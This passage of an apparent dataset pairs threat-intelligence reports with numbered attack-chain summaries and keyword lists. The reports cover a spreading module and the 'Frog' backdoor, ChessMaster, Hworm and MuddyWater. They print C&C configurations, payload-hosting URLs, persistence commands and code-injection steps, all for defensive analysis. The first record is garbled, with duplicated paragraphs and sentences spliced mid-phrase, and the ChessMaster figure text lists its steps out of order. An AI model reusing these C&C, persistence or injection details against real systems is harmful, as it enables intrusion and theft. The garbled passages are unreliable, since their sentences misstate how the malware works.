DataThe “adt.dat” file is an encrypted INI-file of known credentials of users in current domain and attacked organization. When decrypted this file looks like this:[user] login = “%User1%” [user] login = “%User2%” admin = “1”This information is checked against local domain controller to find active users with Admin privileges. Verified account is used for optional functionality to establish a NetBIOS connection with remote host to change remote registry. However, the only setting that is changed is MapMenuConfigGrps value mentioned above. It is set to local parameters of system proxy server which were acquired before. This is done right after the main attack procedure which uses vulnerability from MS08-067 Security Bulletin.The MS08-067 attack procedure uses code identical to the code of scanning for vulnerable hosts in Netscan module. It starts with pinging the host with ICMP Echo requests and checking host availability. Then it does complex OS fingerprinting using several different approaches to guess OS version, OS language and Service Pack version. After that it crafts special packet and embeds a payload from AAA config (binary parameter named msexploit_loc, see above).In the end of exploitation process, the module checks availability of the remote host by sending ICMP Echo requests again.This module doesn’t change local registry, nor does it created any local files.After completing remote attack, the module sends logs to the C&C server. The connection options are retrieved from the configuration (resource):Option nameD_CONNDescriptionList of C&C domain names, separated by ‘;’D_RPRTC&C server portD_NAMERelative URL to send request toThe data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP computers in local area network by another module known as “Frog” (full description of Frog is available in a separate chapter), which is embedded in current executable.The later is a backdoor component which provides capability to run arbitrary executable on the remote target. To infect other computers current module uses adt.dat password database file. This contains credentials of administrator accounts. The credentials are used to access system administrative share and remotely install the backdoor as a service.DllMain functionWhen loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an internal plugin framework. The main function of the module is named “task_da_svcinstall” and is registered in the framework. Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.The decoded resource data for the known sample can be represented as the following script:SetOption(conn_a.VERSION_ID, [6] “11997”) SetOption(conn_a.VER_SESSION_ID, %removed%) SetOption(conn_a.SEND_DELAY_TIME, [5] “2000”) SetOption(conn_a.D_CONN, [60] “microsoftosupdate.com;microsoft- msdn.com;microsoftcheck.com”) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_NAME, [18] “/cgi-bin/ms/flush”) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] “%removed%”) SetOption(conn_a.J_CONN, [60] “microsoftosupdate.com;microsoft- msdn.com;microsoftcheck.com”) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_NAME, [18] “/cgi-bin/ms/check”) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_USER, [21] “%removed%”) SetOption(da_svc_exe_loc, 103424 bytes of Frog backdoor) SetOption(da_svc_exe_name, “testsvc_00.exe”) SetOption(da_svc_name, “testsvc_00_name”) SetOption(da_svc_send_proxy, 0x0079) SetOption(da_svc_host) SetOption(da_svc_host, [15] “%Target1_IP%”)21/25SetOption(da_svc_host, [14] “%Target2_Hostname%”) SetOption(da_svc_host, [16] “%Target3_IP%”) Call(task_da_svcinstall)Main function (task_da_svcinstall)The config defines parameters for the method task_da_svcinstall, which includes the following:da_svc_exe_loc – a payload with “Frog” backdoor to be pushed to the remote host; da_svc_exe_name – defines filename that will be used to store the backdoor; da_svc_name – defines service name that will be used to setup the backdoor service; da_svc_send_proxy – if this value is set to 0x79, remote host proxy preferences will be copied from current host to the remote registry; da_svc_host – is a list of target hosts to attack.Then the module gets local proxy settings, starting from MS Internet Explorer settings, then parsing Opera profile files (if exist) and finally getting proxy settings from quite suspicious registry keys:HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps HKLMSoftwareWow6432NodeMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrpsIt seems that MapMenuConfigGrps registry value doesn’t exist on standard Windows system. We believe that this registry key is set by a malicious module during operation and is used to store proxy server parameters.After that, the module attempts to find %AppData%adt.dat. Two variants are checked – common and user-specific, i.e.:C:Documents and SettingsAll UsersApplication Data C:Documents and SettingsusernameApplication DataThe “adt.dat” file is an encrypted INI-file of known credentials of users in current domain and attacked organization. When decrypted this file looks like this:[user] login = “%User1%” [user] login = “%User2%” admin = “1”This information is checked against local domain controller to find active users with Admin privileges. Verified account is used for optional functionality to establish a NetBIOS connection with remote host to change remote registry. However, the only setting that are changed is MapMenuConfigGrps value mentioned above. It is set to local parameters of system proxy server which were acquired before.22/25Next procedure is to establish a SMB connection with %Target% and check if testsvc_00_name service is running. If it does the module uses Service Control Manager to stop the remote service. Then it copies Frog backdoor file embedded in AAA config/script to the remote path %Target%ADMIN$%SYSTEM%testsvc_00.exe.After that it starts the service using Service Control Manager and checks if the Frog backdoor successfully started by querying its status over named pipe %Target%pipenetNtControlListener or via direct TCP connection on port 4444.Current module has some extra features that are not being used according to embedded config. In addition to function called task_da_svcinstall it has 3 others:task_da_svcuninstall- to remove the installed Frog service and its file; task_da_svcstatus- to check the remote Frog service status via Service Control Manager; task_da_rem_proxy – transfer current proxy preferences to the remote host.This module doesn’t change local registry, nor does it created any local files.After completing remote attack, the module sends logs to the C&C server. The connection options are retrieved from the configuration (resource):Option nameD_CONNDescriptionList of C&C domain names, separated by ‘;’D_RPRTC&C server portD_NAMERelative URL to send request toThe data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP with Microsoft Visual Studio 2010.This module is used to backdoor current computer and is used in pair with remote exploit modules (i.e. ms_exploit). It is capable of running arbitrary executable code by saving a file coming from another local machine or a C&C and starting it as a new process (EXE), loading it from disk to memory as a DLL or mapping it directly from memory and running in a “diskless” mode. It is designed to be lightweight module, which fits in 100Kb of data, doesn’t create any logs and isn’t linked with any external libraries.DllMain23/25When loaded, the module retrieves its resource of type “BBB” and name “AAA”. It decrypts the resource and parses config parameters. Unlike most of other modules, config parameters for this module has different format, it is not a script-like config, but plain binary structure with integer and string values.ServiceMainIf current module is started by the system during Windows boot as a service, then ServiceMain function will be called by the system. The code in the function fetches Registry value from HKLMSOFTWAREMicrosoftWindows NTCurrentVersionSvcHostepvsvcsAuthCapabilitis, if this value is not set it will be set right away. The value is 20 bytes binary hash value of system dependent information (i.e. username, hostname). It is used as system ID.After that the module creates three independent threads:NamedPipeThread (server mode) This thread creates a named pipe .pipenetNtControlListener (pipe name defined in the “AAA” config) and waits for incoming connections. TCPThread (server mode) This thread opens a listening TCP port 4444 (port number defined in the “AAA” config) and waits for incoming connections. CnCThread (client mode) This thread sends a port requests to C&C server URL url upgrade.com/cgi-bin/frog (defined in “AAA” config), containing current system information, including current user name, computer name, local ip address, domain name, system ID and more, gets and interprets a response.While NamedPipeThread and TCPThread work in server mode, which means that they are waiting for incoming client connections and requests, the last thread CnCThread actively connects to the C&C, uploads current system information and expects a response. The logics of processing transmitted data for all threads are similar. They can either send out data about current system or receive and run an executable module. There are three variants of executables that these modules can handle:EXE The received module is stored on disk in %TEMP%system32uid.%Current Date and Time XORed with 0xA4F2%.tmp and started in a separate process with CreateProcess API. DLL The received module is stored on disk in %TEMP%system32uid.%Current Date and Time XORed with 0xA4F2%.tmp and loaded in current process with LoadLibrary API. PE-IN-MEMORY The received module is kept in memory of current process using own PE file loader.WinMessage functionThis function combines DllMain and ServiceMain functions excluding system service manager routines.This module changes local registry and sets current system ID, as described above, it is also capable of creating local files. It doesn’t make any local reports nor does it send execution logs to the C&C server. The only information sent to the C&C server is general system info during first stage of receiving and executing additional payload.24/25Next25/25 "," 1. Initial infection via exploit, trojan, or other vector. 2. First stage runs reconnaissance and collects system data. 3. Second stage deploys modules for persistence, spreading, and exfiltration. 4. Persistence modules ensure malware continues running on infected systems. 5. Spreading modules scan for vulnerable systems and use exploits to infect them. 6. Exfiltration modules steal data and send it encrypted to command servers. 7. Modular architecture allows attackers to customize the attack by deploying only needed modules. ",valid_41,"['INI', 'first stage', 'Recon', 'collects', 'system', 'data', 'Second Stage', 'modules', 'persistence', 'SP', 'exfiltration', 'malware', 'scan', 'exploits', 'servers', 'attackers', 'the attack']",INI; first stage; Recon; collects; system; data; Second Stage; modules; persistence; SP; exfiltration; malware; scan; exploits; servers; attackers; the attack.
"ChessMaster’s New Strategy: Evolving Tools and TacticsPosted on:November 6, 2017 at 4:48 am Posted in:Bad Sites, Targeted Attacks Author: Trend Microby MingYen Hsieh, CH Lei, and Kawabata Kohei A few months ago, we covered the ChessMaster cyberespionage campaign, which leveraged a variety of toolsets and malware such as ChChes and remote access trojans like RedLeaves and PlugX to compromise its targets—primarily organizations in Japan. A few weeks ago, we observed new activity from ChessMaster, with notable evolutions in terms of new tools and tactics that weren’t present in the initial attacks. From what we’ve seen, ChessMaster is continuously evolving, using open source tools and ones they developed, likely as a way to anonymize their operations. Based on the way the campaign has developed, it won’t be surprising to see additional evolutions from ChessMaster in the future. Infection VectorHere is a summary of how ChessMaster enters a target system:Figure: 1 ChessMaster infection chain.vulnerability (CVE-2017-8759) that affects the Microsoft .NET Framework1. An exploit document arrives on a target system. This document abuses a SOAP WSDL parser 2. It then accesses the remote server 89[.]18[.]27[.]159/img.db 3. Once the victim opens the document, the attacker can execute arbitrary commands on the victim’s 4. The exploit document then launches mshta.exe to access 89[.]18[.]27[.]159:8080/lK0RS, which serves 5. This backdoor launches a malicious PowerShell script 6. The PowerShell script downloads and activates the malware located in the remote server 7. jpg is the second backdoor, which uses the Command-and-Control (C&C) server62[.]75[.]197[.]131.machine. as the ﬁrst backdoor into the system89[.]18[.]27[.]159/FA347FEiwq.jpgAs mentioned earlier, the ﬁrst step of the new campaign involves the use of an exploit document that connects to the remote server 89[.]18[.]27[.]159/img.db when opened. Img.db holds the exploit command, which will execute the content of another remote server, 89[.]18[.]27[.]159:8080/lK0RS, via mhsta.exe. The image below shows the malicious link 89[.]18[.]27[.]159/img.db embedded in the exploit document:Figure 2. Link embedded in the document89[.]18[.]27[.]159:8080/lK0RS is a JScript backdoor, which apparently comes from an open source RAT known as “Koadic.” At this stage, we observed that the attacker tried to gather the system’s environment information via command line tools. We also observed that some commands were based on the result of a previous command, which means that not all parts of the attack were automated and that parts of the commands were done manually. While this might be a sign of a more sophisticated automation technique, we believe that this may be an attacker trying to get up close and personal by manually checking the environment before delivering the ﬁnal payload. It is possible that this was done to avoid sandboxing or analysis by researchers. While we were not able to gather the actual live data of the next step of the attack, we were able to observe Koadic and the following script, which tries to download another DLL ﬁle from the same server that hosts Koadic, at the same time. We believe that FA347FEiwq.jpg serves as the ﬁnal payload of this attack.Figure 3: PowerShell script used to download & execute FA347FEiwq.jpgThe script attempts to download the ﬁle from 89[.]18[.]27[.]159/FA347FEiwq.jpg (detected by Trend Micro as BKDR_ANEL.ZKEI), a DLL ﬁle which serves as the second backdoor. The Powershell script leverages RegisterXLL, which is a component of Excel, to load BKDR_ANEL into Excel.exeFigure 4: FA347FEiwq.jpg is loaded by Excel.exeBackdoor Analysis BKDR_ANEL is downloaded from89[.]18[.]27[.]159. Once loaded onto the system, it will launch and inject code into svchost.exe, after which the injected code decrypts and activates the embedded backdoor. BKDR_ANEL has a Microsoft signature attached—the signature is invalid and likely added to make it seem more harmless. The backdoor has a hardcoded malware version labeled “5.0.0 beta1” that contains basic backdoor routines with a string-like “Function not implemented.” inside. The relatively incomplete code might be a clue of a new variant in the future. The malware’s C&C protocol is very similar to the one used by BKDR_CHCHES at ﬁrst glance:Figure 5: Comparison of BKDR_ANEL and BKDR_CHCHES’ C&C protocolsHowever they are different backdoors, with BKDR_CHCHES employing RC4 as its main encryption algorithm wherein the decryption key is sent with the encrypted information separated by “=” and set in theCookie header. On the other hand, BKDR_ANEL utilizes Blowﬁsh with the hardcoded encryption key obviously labeled as “this is the encrypt key.” Another difference between the two is that BKDR_CHCHES does not contain any backdoor routines by default. Instead, it loads additional modules from the C&C server directly into memory. Alternatively, BKDR_ANEL is more like a regular backdoor embedded with basic backdoor routines. The image and table below illustrate the information BKDR_ANEL sends, and how BKDR_ANEL encrypts the information.Figure 6: Information sent by BKDR_ANEL (1/2)Offset Description 0x3aMD5(computer name + machine GUID)Computer name User name0x47Time zone information0x53Current directory0x87Backdoor versionExample in previous ﬁgure 78 0C 00 00 20 C4 36 1D 03 2F 93 B8 C7 A0 01 9A EB 2B BD EFTEST 1508201270 5.1.2600 Administrator 00 00 00 00 => – (Bias / 60) 00 00 00 00 => – (Bias % 60) 01 00 00 00 => Has DaylightBias or notC:\Documents and Settings\Administrator\My Documents 5.0.0 beta1Table 1: Information sent by BKDR_ANEL (2/2)Figure 7: BKDR_ANEL encryption processThe information blocks are separated by “&”. As seen in the image above; the string before “=” in each block, such as “oVG,” is not used. Further similarities between BKDR_ANEL and BKDR_CHCHES can be seen in special partial MD5 logic. Both malware only uses the middle 8 bytes from the regular MD5 result. BKDR_CHCHES will use it to encrypt the network trafﬁc, while BKDR_ANEL uses it as a code branch in the malware encryption routine, although from our analysis, it does not look like it is currently in use. Mitigation To combat campaigns like ChessMaster, organizations need to make full use of the tools available to them. This includes everything from regularly updating their systems to the latest patches, which minimizes the impact of attacks that leverage vulnerabilities. In addition, the proper use of behavior monitoring, application control, email gateway monitoring, and intrusion/detection systems can help detect any suspicious activities that occur within the network. Finally, organizations need to cultivate a culture of security to educate users on what to look out for in terms of potential attacks, as end users are often the primary target of these kinds of campaigns. Organizations can also strengthen their security by employing solutions such as Trend Micro™ Vulnerability Protection™, which protects endpoints from threats that exploit vulnerabilities via a high-performance engine monitors trafﬁc for new speciﬁc vulnerabilities that uses host-based intrusion prevention system (IPS) ﬁlters as well as zero-day attack monitoring. In addition, comprehensive security solutions can be used to protect organizations from attacks. These include Trend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites, and Worry- Free™ Business Security, which can protect users and businesses from these threats by detecting malicious ﬁles, well as blocking all related malicious URLs. Trend Micro Deep Discovery™ has an email inspection layer that can protect enterprises by detecting malicious attachment and URLs. Trend Micro OfﬁceScan™ with XGen™ endpoint security infuses high-ﬁdelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against all kinds of threats. Indicators of Compromise: hxxp://89[.]18[.]27[.]159:8080/lK0RS hxxp://89[.]18[.]27[.]159/FA347FEiwq.jpg MailRelated Posts:ChessMaster Makes its Move: A Look into the Campaign’s Cyberespionage Arsenal New Malicious Macro Evasion Tactics Exposed in URSNIF Spam MailLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE»SMALL BUSINESS»HOME»Tags: ChessMaster0 CommentsTrendLabsRecommendShare⤤Start the discussion…LOG IN WITHOR SIGN UP WITH DISQUS?Login1 Sort by BestSubscribe✉dAdd Disqus to your siteAdd DisqusAddPrivacy  "," 1. The attack starts with a phishing email containing an exploit Office document. 2. The document abuses a .NET Framework vulnerability (CVE-2017-8759) to access a remote server. 3. When opened, the document executes code from the remote server img.db. 4. The executed code launches mshta.exe to access the backdoor at lK0RS. 5. The first backdoor lK0RS launches a malicious PowerShell script. 6. The PowerShell script downloads and activates the second backdoor located at FA347FEiwq.jpg. 7. The second backdoor BKDR_ANEL injects into svchost.exe and connects to its command and control server. 8. BKDR_ANEL can receive additional modules from the command and control server. ",valid_87,"['the attack', 'the document', 'use', 'CVE-2017-8759', 'code', 'the remote server', 'img.db', 'launches', 'mshta.exe', 'the backdoor', 'lK0RS', 'a malicious PowerShell script', 'The PowerShell script', 'the second backdoor', 'FA347FEiwq.jpg', 'connects', 'Command', 'additional modules']",the attack; the document; use; CVE-2017-8759; code; the remote server; img.db; launches; mshta.exe; the backdoor; lK0RS; a malicious PowerShell script; The PowerShell script; the second backdoor; FA347FEiwq.jpg; connects; Command; additional modules.
"Blog Home (url > Unit 42 (url > Houdini’s Magic ReappearanceHoudini’s Magic ReappearanceBy Anthony Kasza (url kasza/) and Esmid Idrizovic (url idrizovic/) October 25, 2016 at 9:29 AM Category: Unit 42 (url  2,348(url houdinis magic reappearance/?share=facebook&nb=1)(url houdinis magic reappearance/?share=twitter&nb=1)(url houdinis magic reappearance/?share=linkedin&nb=1) 34Unit 42 has observed a new version of Hworm (or Houdini) being used within multiple attacks. This blog outlines technical details of this new Hworm version and documents an attack campaign making use of the backdoor. Of the samples used in this attack, the first we observed were June 2016, while as of publication we were still seeing attacks as recently as mid  October, suggesting that this is likely an active, ongoing campaign. Deconstructing the Threats: The investigation into this malware began while searching through WildFire (url the network/subscriptions/wildfire) execution reports within AutoFocus (url the network/subscriptions/autofocus). Looking for newly submitted malicious samples with no family label, a unique mutex surfaced, “RCSTEST”. Pivoting around the creation of this mutex, as well as other dynamic behaviors, a group of samples slowly began to emerge. The group of samples has common delivery mechanisms, lures and decoy file themes, payloads (Hworm), as well as control infrastructure.Samples from this attack came in the form of SFX files. The original filenames of these delivery files are related to political figures and groups in the Middle East and the Mediterranean. They include:Mohamed Dahlan Abu Dhabi Meeting.exe ﺭﻣﺧﻟﺍ ﺏﺭﺷﻳ ﻥﺎﻏﻭﺩﺭﺍ ﻝﻳﻘﺛﻟﺍ ﺭﺎﻳﻌﻟﺍ ﻥﻣ ﺔﺣﻳﺿﻓ.exe ﻥﻳﻣﻠﺳﻣﻟﺍ ﻥﺍﻭﺧﻻﺍ ﻑﻭﻔﺻ ﻲﻓ ﺔﻳﻠﺧﺍﺩ ﺕﺎﻋﺍﺭﺻ.exe ﻝﺎﻣﻛ ﺩﻣﺣﻣ ﺭﻭﺗﻛﺩﻟﺍ ﻝﺎﻳﺗﻏﺍ ﺔﻳﻠﻣﻋ.scr ﻥﻼﺣﺩ ﺩﻋﻭﺗﻳﻭ ﺞﻳﻠﺧﻟﺍ ﻝﻭﺩ ﺩﺩﻬﻳ ﷲ ﺩﺑﻋ ﻙﻠﻣﻟﺍ.exe ءﺍﻭﻬﻟﺍ ﻰﻠﻋ ﻥﻳﻧﻁﺍﻭﻣ ﻥﻳﻬﻳ ﻱﺩﻭﻌﺳ ﺭﻳﻣﺍ ﻭﻳﺩﻳﻔﻟﺎﺑ.scrWhen executed each SFX file opens a decoy document, video, or URL, and eventually executes an Hworm payload in the background. The decoy files are similarly themed when compared to the above delivery file names. Figure 1 shows a screenshot from a video one sample opens as a decoy.(url content/uploads/2016/10/Houdini_1.png)Figure 1 Decoy videoAnother sample displays a YouTube video by dropping a .url shortcut and opening it using the system’s default web browser. Figure 2 illustrates the .url file contents:(url content/uploads/2016/10/Houdini_2.png)Figure 2 .url fileWhen the .url file is opened, the above YouTube video is displayed as a decoy. It is unclear at this time if the uploader of this video has any relation to this particular attackBesides decoys, the samples also execute Hworm payloads, all of which are packed. Each Hworm payload created a unique mutex (while some SFX files delivered the same Hworm payload). All of the samples beaconed to one of three network locations as shown in Figure 3:(url content/uploads/2016/10/Houdini_3.png)(url content/uploads/2016/10/Houdini_4.png)(url content/uploads/2016/10/Houdini_5.png)Figure 3 C2 InfrastructureWhile prior reports on Hworm have been published (url research/2013/09/now you see me  h worm by houdini.html), we were unable to identify any report detailing this particular version of Hworm. Some previous versions would embed AutoIT scripts in resource sections of PE files while others would execute obfuscated VBS scripts. Some previous versions of the Hworm implant would embed data in the headers of HTTP requests or POST bodies as a method of command and control. Beacons of that HTTP protocol example are easily recognized by the use of ‘<|>’ as a delimiter and the URI of the request. This new version of Hworm uses a mixed binary and ASCII protocol over TCP. Figure 4 is a packet capture of the protocol used by Hworm samples in this attack. It includes the string “new_houdini”, the mutex used by the implant, the name of the user, the operating system version, the version of the implant, and the name of the foreground process:(url content/uploads/2016/10/Houdini_6.png)Figure 4 Packet capture of new communications protocolDuring the investigation of this malware a forum post on dev point[.]com, an Arabic speaking technology and security forum, by a user with the handle “Houdini”, outlined plans for a rewrite of a backdoor in Delphi. This post occurred around July 2015.Around October 2015, a password protected beta version of the builder used to create Delphi Hworm implants builder used to create the samples outlined in the above attack was not located. Unit 42 believes the samples used in the above attack are a version which were released after the beta. Analyzing the Hworm Malcode: Upon configuring and building a server, the builder prompts the user to save a VBS file and modifies a stub file to create the implant. The VBS file is used to load and inject the implant. It appears that the operators behind the above attack either chose to not use the VBS loader or the newer versions of the builder no longer produce a VBS script. The VBS Loader: The script contains three files encoded in base64. The first file is DynamicWrapperX (url  coding.com/dynwrapx_eng.html) (DCOM_DATA), the second file is the RunPE shellcode (LOADER_DATA), and the third file is the file which gets injected into host process (FILE_DATA). DynamicWrapperX provides access to all Windows APIs from a Visual Basic Script providing a wide range of functionality to this VBS script.The configuration of the script is at the beginning of the file (Figure 5).(url content/uploads/2016/10/Houdini_7.png)Figure 5 Script configuration sectionIn the above example, the script will use the registry as a startup method, it will drop itself into the system’s %appdata% directory using the filename myhworm.exe and it will inject itself into svchost.exe.As the script executes it first adds one of three startup methods which will execute the script on Windows startup:Registry Run in HKCU Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run EntryData Wscript.exe //b //e:vbscript <filepath> /b Specifies batch mode, which does not display alerts, scripting errors, or input prompts. /e Specifies the engine that is used to run the script. Define startup directory1 Following the installation of persistence, the script checks if the current environment is WOW64. If so, the script will execute:Startup task (not implemented yet)1 %windir%\syswow64\wscript.exe /b /e:vbscript <filepath> The script then drops DynamicWrapperX in the configured installation directory with file extension “.bin”.1 <installdir>\<filename>.bin It will then register DynamicWrapperX:1 regsvr32.exe /I /S <filename_dynamic_wrapperx> Next, the script will load the registered object:1 “set DCOM = CreateObject(""DYNAMICWRAPPERX"")” It registers /load VirtualAlloc and CallWindowProcW as functions which can be directly called in the script using “dcom.VirtualAlloc <arguments>”.Using VirtualAlloc it will allocate new memory and copy RunPE shellcode (LOADER_DATA, loader.hex) and the to be  injected binary (FILE_DATA) into memory.Using CallWindowProcW the script will jump to the RunPE shellcode and the shellcode will inject the file (FILE_DATA) into the host process. The host process is by default svchost.exe but for .NET files injection can occur into the file:1 %windir%\Microsoft.Net\Framework\v2.0.50727\msbuild.exe Figure 6 shows the main routine of the script:(url content/uploads/2016/10/Houdini_8.png)Figure 6 Main routineFigure 7shows a hex dump of LOADER_DATA (RunPE shellcode):(url content/uploads/2016/10/Houdini_9.png)Figure 7 Hex dump of LOADER_DATASimilarities in comments and coding styles between previous versions of the Hworm VBS script and the VBS script provided in this beta builder can be seen in Figure 1. Top is the VBS file from the HTTP version of Hworm, compared with the VBS script produced by the beta builder of Hworm (below).(url content/uploads/2016/10/Houdini_10.png)(url content/uploads/2016/10/Houdini_11.png)Figure 8 Similarities between HWorm versionsThe Beta Server:The Beta Server: The main server which the builder produces is developed in Delphi and is not encrypted. Unit 42 has seen variants packed with VMProtect and ASPack. In some versions of the Delphi Hworm implants discovered (unpacked beta versions) the settings are stored in the resource section RCData\“CONFIG” and are in clear text (Figure 9).(url content/uploads/2016/10/Houdini_12.png)Figure 9 SettingsSome versions also have an unfinished PE spreader in the resource section processes named “sm?rtp.exe” and execute a VBS file using wscript.exe:1 “wscript.exe /e:vbscript <current directory>\$RECYCLE.BIN\u vbs name here”.(url content/uploads/2016/10/Houdini_13.png)Figure 10 SpreaderThe server exports some unused functions (they all just have RET instruction). We have seen “wrom.exe” and “server.exe” used as the name in the export table (Figure 11).(url content/uploads/2016/10/Houdini_14.png)Figure 11 Export tableThe author used the open source library Indy Components for network communication. They also used BTMemoryModule to load DLLs from memory (without saving it on the disc).The Hworm implants use a connect back communication. This means the server (implant) connects back to the client (remotely controlling system). It also has some modules implemented in the server and each module uses its own socket for communication (on the same port defined in the configuration).The following modules provide features of this malware:Screenshot: Provides the ability to capture screenshots in JPEG/BMP formats Keylogger: Provides the ability to log key strokes Internet IO: Provides the ability to download and execute files from the internet. It also provides the ability to load the executables via the RunPE technique File Manager: Provides the ability to list files and directories, delete, rename, and execute files, and upload or download files via TCP or HTTP Password: Provides the ability to steal passwords from Firefox, Opera, and Chrome browsers Misc: Provides the ability to list processes or modules and kill running processes USB Notifier: Provides the ability to notify the controller when a USB device is attached Houdini Client: Provides the main client, which contains the server’s configuration.Final Thoughts: The similarities in coding styles and features of the server, as well as languages and handles used by the author of the malware, lead us to believe the beta builder is a version of Hworm which was created somewhere between the HTTP version and the version used in the above outlined attack.As this RAT can be found online in semi public locations it is possible the malware is used by both surgical threat actors as well as within casual compromises. The above attack is only one such campaign Unit 42 has discovered using the Delphi versions of Hworm.Palo Alto Networks customers can use AutoFocus to find all versions of Hworm samples using the “Hworm” tag. Indicators: Delphi Hworm Beta Builder Command and Control Network Locations start.loginto[.]me samah.sytes[.]net 52.42.161[.]75 78.47.96[.]17 136.243.104[.]200Got something to say?Leave a comment Notify me of followup comments via e mailName (required)Email (required)WebsiteSUBMITSUBSCRIBESUBSCRIBE TO NEWSLETTERSEmailCOMPANY Company (url Careers (url Sitemap (url Report a Vulnerability (url disclosure)LEGAL NOTICES Privacy Policy (url notices/privacy) Terms of Use (url notices/terms of use)ACCOUNT Manage Subscription (url (url alto networks)  (url  (url© 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788 SEE A DEMO TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL UTD) ","1. The attacker sends phishing emails with SFX files containing politically-themed filenames and decoys. 2. The SFX droppers execute decoy documents/videos and drop the Hworm payload in the background. 3. Hworm connects back to the C2 server using a TCP-based command protocol. 4. The implant collects system information and sends it to the C2. 5. The attacker can remotely control infected hosts using Hworm's modules for screengrabs, keylogging etc. 6. Hworm ensures persistence by adding registry run keys or startup tasks. 7. The attacker continually sends commands and receives exfiltrated data from victims over the C2 channel. 8. New versions of Hworm with updated configurations are deployed in successive waves of attacks. ",valid_64,"['SFX files', 'decoys', 'documents', 'video', 'HWorm', 'the background', 'C2', 'us', 'TCP', 'command', 'the implant', 'control', 'modules', 'persistence', 'Registry', 'Startup task', 'RAT', 'data', 'attacks']",SFX files; decoys; documents; video; HWorm; the background; C2; us; TCP; command; the implant; control; modules; persistence; Registry; Startup task; RAT; data; attacks.
"MENUGet Support | English [change]Blog Home > Unit 42 > Muddying the Water: Targeted Attacks in the Middle EastMuddying EastBy Tom Lancaster November 14, 2017 at 1:00 PM Category: Unit 42 Tags: FIN7, Lazagne, Meterpreter, Mimikatz, MuddyWater3,170(2)Summary This blog discusses targeted attacks against the Middle East taking place between February and October 2017 by a group Unit 42 is naming “MuddyWater”. This blog links this recent activity with previous isolated public reporting on similar attacks we believe are related. We refer to these attacks as MuddyWater due to the confusion in attributing these attacks. Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related. The MuddyWater attacks are primarily against Middle Eastern nations. However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA. MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based ﬁrst stage backdoor we call  “POWERSTATS”. Despite broad scrutiny and reports on MuddyWater attacks, the activity continues with only incremental changes to the tools and techniques.Introduction & Overview The Palo Alto Networks Unit 42 research team recently came across a series of malicious ﬁles which  were almost identical to those targeting the Saudi Arabian government previously discussed by MalwareBytes. Which in turn, closely resembles a previous article by Morphisec. These attacks have also been tracked by several other researchers on Twitter and elsewhere. The activity has been consistent throughout 2017 and, based on our analysis, targets or is suspected to target, entities in the following countries:Saudi Arabia United Arab Emirates USAThe malicious documents were adjusted according to the target regions, often using the logos of branches of local government, prompting the users to bypass security controls and enable macros. An overview of the technical changes seen in the past year is given in the graphic below, note that raw IOCs present in this graphic can be found as text in the Appendix at the end of this article.Figure malwareMuddyWater in the Middle East The attackers behind MuddyWater have been active throughout 2017, with targets across the Middle East and surrounding areas, examples of the decoy documents observed is given in Table 1. Of course, being named in a decoy document doesn’t mean any of these organizations have been attacked themselves or are involved in the attacks: the MuddyWater actors are abusing the trust these organizations’ names and/or logos command for their malicious purposes. Telenor.docCirculars.doc dollar.doc Pakistan Federal Investigation Agency CV of Middle Eastern Civil ServantIraq National Intelligence Service Kaspersky Security solution 2017.doc Arab Emirate (cid:1)(cid:2)ی .docm Iraq Commission of IntegrityRequirements of the Sago.doc CommIT-Document.doc Conﬁdential letters.doc Iraq Kurdistan Regional Government RFP_VOIP.docRFP.doc Requirement.doc Iraq Kurdistan Regional GovernmentMar CERT-Audit-20172802-GEO.xlsSuspected PakistanIraqArab EmiratesSaudi Arabia attacks.All of these documents we observed and outlined above are related via:Shared C2 infrastructure. Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS). Shared attributes of the malicious documents used in attacks. Shared attributes as to how the documents were delivered.Based on these connections we can be conﬁdent that all the ﬁles and infrastructure we give in our   appendices are related, since more than one of these can be used to link each of the samples discussed in each case.I download my tools from GitHub, and so do my victims. The tools used by the MuddyWater attackers have been well documented by the previously cited research and a common theme of previous reporting was the open source nature of much of the toolset used by MuddyWater: Meterpreter, Mimikatz, Lazagne, Invoke-Obfuscation etc In some of their recent attack documents, the attackers also used GitHub as a hosting site for their custom backdoor, POWERSTATS. Speciﬁcally, the following GitHub repositories appear to be controlled by the  MuddyWater threat actor(s):[unknown SHA256][unknown SHA256]Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exeDownloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe others)Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.jsInterestingly, both proﬁles were populated with forked repositories to give them an air of legitimacy as  shown in ﬁgure 2. The POWERSTATS malware was compiled as an exe using  PS2EXE. However, this was a minor anomaly, as it was only seen in this case: raw scripts being used in all other cases.Figure FIN7.Pwn one to pwn them all In some of the instances we observed what appeared to be compromised accounts at third party organizations sending the malware. In one case, the attackers sent a malicious document which was nearly identical to a legitimate attachment which we observed later being sent to the same recipient. This indicates that the attackers stole and modiﬁed a legitimate document from the compromised user  account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it. This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it 